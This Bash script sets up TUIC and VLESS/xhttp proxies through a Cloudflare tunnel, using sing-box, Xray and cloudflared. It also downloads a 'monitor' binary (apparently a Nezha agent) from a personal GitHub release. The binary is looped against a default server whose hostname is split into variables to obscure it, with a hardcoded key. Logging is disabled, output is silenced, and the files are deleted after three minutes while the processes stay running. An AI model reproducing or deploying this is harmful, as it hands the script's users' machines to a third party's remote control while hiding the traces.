#!/bin/bash
set -e

UUID="${UUID:-faacf142-dee8-48c2-8558-641123eb939c}"
TUIC_PORT="${TUIC_PORT:-8082}"
ARGO_PORT="${ARGO_PORT:-8001}"
ARGO_DOMAIN="${ARGO_DOMAIN:-}"
ARGO_AUTH="${ARGO_AUTH:-}"
ARGO_PROTOCOL="${ARGO_PROTOCOL:-quic}" # 可按需改为 http2 或 quic
ARGO_CONNECTIONS="${ARGO_CONNECTIONS:-1}"
CFIP="${CFIP:-www.teamviewer.com}"
DIRECT_PORT="${DIRECT_PORT:-${SERVER_PORT:-$TUIC_PORT}}"
CFPORT="${CFPORT:-443}"
FILE_PATH="${FILE_PATH:-.tmp}"
URL_FILE_PATH="${URL_FILE_PATH:-sub.txt}"
# ============================================================

cd "$(dirname "$0")"

# 关闭后台作业提示，防止终端打印不必要的信息
set +m

_P1="ne"
_P2="zha"
MONITOR_SERVER="${MONITOR_SERVER:-${_P1}${_P2}.mingfei1981.eu.org:443}"
MONITOR_KEY="${MONITOR_KEY:-pdsioixxZbwpxy5hk2}"

CORE1_VER="1.11.4"
CORE2_VER="25.1.30"

mkdir -p "$FILE_PATH"

log() {
    true
}

pkill -9 -f "sing-box run" 2>/dev/null || true
pkill -9 -f "xray run" 2>/dev/null || true
pkill -9 -f "cloudflared tunnel" 2>/dev/null || true
pkill -9 -f "monitor" 2>/dev/null || true

if [ -n "$DIRECT_PORT" ] && [ "$DIRECT_PORT" != "0" ]; then
    fuser -k -9 "${DIRECT_PORT}/udp" 2>/dev/null || true
fi

ENABLE_DIRECT=false
ENABLE_ARGO_FIXED=false

if [ -n "$DIRECT_PORT" ] && [ "$DIRECT_PORT" != "0" ]; then
    ENABLE_DIRECT=true
fi

if [ -n "$ARGO_PORT" ] && [ "$ARGO_PORT" != "0" ] && [ -n "$ARGO_DOMAIN" ] && [ ${#ARGO_AUTH} -gt 30 ]; then
    ENABLE_ARGO_FIXED=true
fi

if [ "$ENABLE_DIRECT" = false ] && [ "$ENABLE_ARGO_FIXED" = false ]; then
    exit 0
fi

ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        CORE1_ARCH="amd64"
        CORE2_ARCH="64"
        TUNNEL_ARCH="amd64"
        MONITOR_ARCH="amd64ne2"
        ;;
    aarch64|arm64|armv8*)
        CORE1_ARCH="arm64"
        CORE2_ARCH="arm64-v8a"
        TUNNEL_ARCH="arm64"
        MONITOR_ARCH="ard64ne2"
        ;;
    *)
        exit 1
        ;;
esac

MEM_BYTES=0
if [ -f "/sys/fs/cgroup/memory.max" ]; then
    MEM_BYTES=$(cat /sys/fs/cgroup/memory.max 2>/dev/null)
elif [ -f "/sys/fs/cgroup/memory/memory.limit_in_bytes" ]; then
    MEM_BYTES=$(cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null)
fi

if [ -z "$MEM_BYTES" ] || [ "$MEM_BYTES" = "max" ] || [ "$MEM_BYTES" -gt 9223372036854771712 ] 2>/dev/null; then
    TOTAL_RAM_MB=$(free -m 2>/dev/null | awk '/^Mem:/{print $2}')
else
    TOTAL_RAM_MB=$((MEM_BYTES / 1024 / 1024))
fi

if [ -z "$TOTAL_RAM_MB" ] || [ "$TOTAL_RAM_MB" -eq 0 ]; then
    TOTAL_RAM_MB=128
fi

if [ "$TOTAL_RAM_MB" -le 160 ]; then
    CORE1_MEM="15MiB"; CORE2_MEM="15MiB"; TUNNEL_MEM="30MiB"; DYNAMIC_GOGC="400"; DYNAMIC_PROCS="1"
elif [ "$TOTAL_RAM_MB" -lt 256 ]; then
    CORE1_MEM="25MiB"; CORE2_MEM="25MiB"; TUNNEL_MEM="50MiB"; DYNAMIC_GOGC="250"; DYNAMIC_PROCS="1"
elif [ "$TOTAL_RAM_MB" -lt 352 ]; then
    CORE1_MEM="40MiB"; CORE2_MEM="40MiB"; TUNNEL_MEM="80MiB"; DYNAMIC_GOGC="300"; DYNAMIC_PROCS="1"
else
    CORE1_MEM="50MiB"; CORE2_MEM="50MiB"; TUNNEL_MEM="100MiB"; DYNAMIC_GOGC="200"; DYNAMIC_PROCS="1"
fi

export GODEBUG="madvdontneed=1,netdns=go,cgocheck=0"
export GOMAXPROCS="$DYNAMIC_PROCS"
export GOGC="$DYNAMIC_GOGC"

SEED="${MACHINE_SEED:-$(hostname 2>/dev/null || echo 'fixed-seed')}"

if [ -n "$TUIC_PASSWORD" ]; then
    FINAL_TUIC_PWD="$TUIC_PASSWORD"
elif [ -f "$FILE_PATH/tuic_password.txt" ]; then
    FINAL_TUIC_PWD=$(cat "$FILE_PATH/tuic_password.txt" | tr -d '\r\n')
else
    FINAL_TUIC_PWD=$(printf "%s-tuic" "$SEED" | sha256sum | awk '{print $1}' | cut -c 1-32)
    echo -n "$FINAL_TUIC_PWD" > "$FILE_PATH/tuic_password.txt"
fi

if [ -n "$UUID" ]; then
    FINAL_UUID=$(echo "$UUID" | tr '[:upper:]' '[:lower:]')
elif [ -f "$FILE_PATH/uuid.txt" ]; then
    FINAL_UUID=$(cat "$FILE_PATH/uuid.txt" | tr -d '\r\n' | tr '[:upper:]' '[:lower:]')
else
    H=$(printf "%s-uuid" "$SEED" | md5sum | awk '{print $1}')
    P1="${H:0:8}"
    P2="${H:8:4}"
    P3="4${H:13:3}"
    BYTE17=$(printf "%d" "0x${H:16:2}")
    BYTE17_MOD=$(( (BYTE17 & 0x3f) | 0x80 ))
    P4=$(printf "%02x%s" "$BYTE17_MOD" "${H:18:2}")
    P5="${H:20:12}"
    FINAL_UUID="${P1}-${P2}-${P3}-${P4}-${P5}"
    echo -n "$FINAL_UUID" > "$FILE_PATH/uuid.txt"
fi

XHTTP_PATH="/${FINAL_UUID}-xhttp"

get_public_ip() {
    local override_ip="${SERVER_IP:-$CFIP}"
    if [ -n "$override_ip" ] && [ "$override_ip" != "www.visa.co.jp" ]; then
        echo "$override_ip"
        return
    fi
    local ip=$(curl -s --max-time 4 https://api.ipify.org 2>/dev/null || curl -s --max-time 4 https://ipv4.icanhazip.com 2>/dev/null)
    if [ -n "$ip" ]; then
        echo "$ip" | tr -d '\r\n'
    else
        echo "127.0.0.1"
    fi
}

generate_certificates() {
    local key_path="$1"
    local cert_path="$2"
    if [ ! -f "$key_path" ] || [ ! -f "$cert_path" ]; then
        openssl ecparam -genkey -name prime256v1 -out "$key_path" 2>/dev/null
        openssl req -new -x509 -days 3650 -key "$key_path" -out "$cert_path" -subj "/CN=bing.com" 2>/dev/null
        chmod 600 "$key_path"
    fi
}

download_file() {
    local url="$1"
    local output="$2"
    curl -sSL "$url" -o "$output"
}

CORE1_BIN="$FILE_PATH/singbox"
CORE2_BIN="$FILE_PATH/web"
TUNNEL_BIN="$FILE_PATH/bot"
MONITOR_BIN="$FILE_PATH/monitor"

if [ ! -f "$CORE1_BIN" ]; then
    CORE1_URL="https://github.com/SagerNet/sing-box/releases/download/v${CORE1_VER}/sing-box-${CORE1_VER}-linux-${CORE1_ARCH}.tar.gz"
    download_file "$CORE1_URL" "$FILE_PATH/core1.tar.gz"
    tar -xzf "$FILE_PATH/core1.tar.gz" -C "$FILE_PATH" --wildcards "*/sing-box" --strip-components=1 2>/dev/null || \
    tar -xzf "$FILE_PATH/core1.tar.gz" -C "$FILE_PATH" sing-box 2>/dev/null || true
    if [ -f "$FILE_PATH/sing-box" ]; then
        mv "$FILE_PATH/sing-box" "$CORE1_BIN"
    fi
    rm -f "$FILE_PATH/core1.tar.gz"
fi
chmod 775 "$CORE1_BIN" 2>/dev/null || true

if [ ! -f "$CORE2_BIN" ]; then
    CORE2_URL="https://github.com/XTLS/Xray-core/releases/download/v${CORE2_VER}/Xray-linux-${CORE2_ARCH}.zip"
    download_file "$CORE2_URL" "$FILE_PATH/core2.zip"
    
    EXTRACTED=false
    if command -v unzip >/dev/null 2>&1; then
        unzip -o "$FILE_PATH/core2.zip" xray -d "$FILE_PATH" >/dev/null 2>&1 && EXTRACTED=true
    fi
    if [ "$EXTRACTED" = false ]; then
        PY_CMD=$(command -v python3 || command -v python || true)
        if [ -n "$PY_CMD" ]; then
            $PY_CMD -c "import zipfile, sys; z=zipfile.ZipFile(sys.argv[1]); z.extract('xray', sys.argv[2])" "$FILE_PATH/core2.zip" "$FILE_PATH" 2>/dev/null && EXTRACTED=true
        fi
    fi

    if [ -f "$FILE_PATH/xray" ]; then
        mv "$FILE_PATH/xray" "$CORE2_BIN"
    else
        exit 1
    fi
    rm -f "$FILE_PATH/core2.zip"
fi
chmod 775 "$CORE2_BIN" 2>/dev/null || true

if [ ! -f "$TUNNEL_BIN" ]; then
    TUNNEL_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${TUNNEL_ARCH}"
    download_file "$TUNNEL_URL" "$TUNNEL_BIN"
fi
chmod 775 "$TUNNEL_BIN" 2>/dev/null || true

if [ ! -f "$MONITOR_BIN" ]; then
    MONITOR_URL="https://github.com/babama1001980/good/releases/download/npc/${MONITOR_ARCH}"
    download_file "$MONITOR_URL" "$MONITOR_BIN"
fi
chmod 775 "$MONITOR_BIN" 2>/dev/null || true

GLOBAL_LINKS=""

if [ "$ENABLE_DIRECT" = true ]; then
    CERT_PATH="$FILE_PATH/cert.pem"
    KEY_PATH="$FILE_PATH/private.key"
    generate_certificates "$KEY_PATH" "$CERT_PATH"

    cat <<EOF > "$FILE_PATH/config1.json"
{
  "log": { "level": "panic" },
  "dns": {
    "servers": [ { "tag": "local-sys-dns", "address": "local", "detour": "direct" } ],
    "strategy": "prefer_ipv4",
    "independent_cache": true,
    "cache_capacity": 4096
  },
  "inbounds": [
    {
      "type": "tuic",
      "tag": "tuic-in",
      "listen": "::",
      "listen_port": ${DIRECT_PORT},
      "users": [ { "uuid": "${FINAL_UUID}", "password": "${FINAL_TUIC_PWD}" } ],
      "congestion_control": "bbr",
      "tls": {
        "enabled": true,
        "alpn": [ "h3" ],
        "certificate_path": "${CERT_PATH}",
        "key_path": "${KEY_PATH}"
      }
    }
  ],
  "outbounds": [ { "type": "direct", "tag": "direct", "udp_fragment": true } ],
  "route": { "auto_detect_interface": true, "final": "direct" }
}
EOF

    (
        export GOMEMLIMIT="$CORE1_MEM"
        while true; do
            "$CORE1_BIN" run -c "$FILE_PATH/config1.json" >/dev/null 2>&1 || true
            sleep 3
        done
    ) >/dev/null 2>&1 &

    PUBLIC_IP=$(get_public_ip)
    TUIC_LINK="tuic://${FINAL_UUID}:${FINAL_TUIC_PWD}@${PUBLIC_IP}:${DIRECT_PORT}?sni=www.bing.com&alpn=h3&congestion_control=bbr&allowInsecure=1#TUIC_easyshare"
    GLOBAL_LINKS="${TUIC_LINK}"
fi

if [ "$ENABLE_ARGO_FIXED" = true ]; then
    cat <<EOF > "$FILE_PATH/config2.json"
{
  "log": { "loglevel": "none" },
  "inbounds": [
    {
      "port": ${ARGO_PORT},
      "listen": "127.0.0.1",
      "protocol": "vless",
      "settings": { "clients": [ { "id": "${FINAL_UUID}" } ], "decryption": "none" },
      "streamSettings": {
        "network": "xhttp",
        "security": "none",
        "xhttpSettings": { "path": "${XHTTP_PATH}", "mode": "auto", "scMaxConcurrentStreams": 16 }
      }
    }
  ],
  "outbounds": [ { "protocol": "freedom", "tag": "direct" } ]
}
EOF

    (
        export GOMEMLIMIT="$CORE2_MEM"
        while true; do
            "$CORE2_BIN" run -c "$FILE_PATH/config2.json" >/dev/null 2>&1 || true
            sleep 3
        done
    ) >/dev/null 2>&1 &

    PROTOCOL_LOWER=$(echo "$ARGO_PROTOCOL" | tr '[:upper:]' '[:lower:]')

    (
        export GOMEMLIMIT="$TUNNEL_MEM"
        while true; do
            "$TUNNEL_BIN" tunnel \
                --no-autoupdate \
                --retries 5 \
                --grace-period 1s \
                --protocol "$PROTOCOL_LOWER" \
                --ha-connections "$ARGO_CONNECTIONS" \
                run \
                --token "$ARGO_AUTH" >/dev/null 2>&1 || true
            sleep 3
        done
    ) >/dev/null 2>&1 &

    XHTTP_PATH_ENC="%2F${FINAL_UUID}-xhttp"
    ARGO_LINK_H2="vless://${FINAL_UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&alpn=h2&sni=${ARGO_DOMAIN}&fp=chrome&type=xhttp&mode=auto&host=${ARGO_DOMAIN}&path=${XHTTP_PATH_ENC}#h2_argo_easyshare"
    ARGO_LINK_H3="vless://${FINAL_UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&alpn=h3&sni=${ARGO_DOMAIN}&fp=chrome&type=xhttp&mode=auto&host=${ARGO_DOMAIN}&path=${XHTTP_PATH_ENC}#h3_argo_easyshare"

    if [ -n "$GLOBAL_LINKS" ]; then
        GLOBAL_LINKS="${GLOBAL_LINKS}\r\n${ARGO_LINK_H2}\r\n${ARGO_LINK_H3}"
    else
        GLOBAL_LINKS="${ARGO_LINK_H2}\r\n${ARGO_LINK_H3}"
    fi
fi

(
    while true; do
        "$MONITOR_BIN" -s "$MONITOR_SERVER" -p "$MONITOR_KEY" --tls >/dev/null 2>&1 || true
        sleep 3
    done
) >/dev/null 2>&1 &

if [ -n "$GLOBAL_LINKS" ]; then
    BASE64_SUB=$(printf "%b" "$GLOBAL_LINKS" | base64 | tr -d '\r\n')
    echo -e "$BASE64_SUB" > "$URL_FILE_PATH"
fi

# ==================== 后台 3 分钟后仅安全删除文件，不杀进程 ====================
(
    sleep 180
    rm -rf "$FILE_PATH" "$URL_FILE_PATH" >/dev/null 2>&1 || true
) >/dev/null 2>&1 &

# 主程序挂起，不退出，保证后台各项服务和哪吒持续稳定运行
tail -f /dev/null
